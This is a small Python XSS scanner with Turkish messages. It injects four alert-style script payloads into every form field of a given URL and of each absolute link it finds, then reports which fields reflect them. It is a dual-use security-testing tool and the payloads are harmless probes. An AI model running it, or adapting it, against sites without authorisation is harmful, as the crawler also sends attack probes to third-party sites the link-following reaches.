import requests
from bs4 import BeautifulSoup

xss_payload = [
    "<script>alert('1')</script>",
    "<img src='x' onerror='alert(\"1\")'>",
    "'\"><img src='x' onerror='alert(1)'>",
    "<iframe onload='javascript:alert(1)'></iframe>",
]

def xsspayload_input(url, input_name, payload):
    form_data = {input_name: payload}
    try:
        response = requests.post(url, data=form_data, allow_redirects=True)
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return False

def xss_kontrol(url):
    inputs = getinputs(url)
    for input_name in inputs:
        for payload in xss_payload:
            result = xsspayload_input(url, input_name, payload)
            if result:
                print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", input_name, "Link:", url)
            else:
                print("XSS zafiyeti YOK (input). Payload:", payload, "Input:", input_name, "Link:", url)

def main():
    print("URL gir: ")
    urls = input()

    main_inputs = getinputs(urls)
    for main_input_name in main_inputs:
        for payload in xss_payload:
            main_result = xsspayload_input(urls, main_input_name, payload)
            if main_result:
                print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", main_input_name)

    links = getlinks(urls)
    for link in links:
        print("\nLink:", link)
        xss_kontrol(link)

def getlinks(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        return [link.get("href") for link in soup.find_all("a") if link.get("href").startswith(("http://", "https://"))]
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return []

def getinputs(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        return [input_tag.get("name") for input_tag in soup.find_all("input")]
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return []

if __name__ == "__main__":
    main()
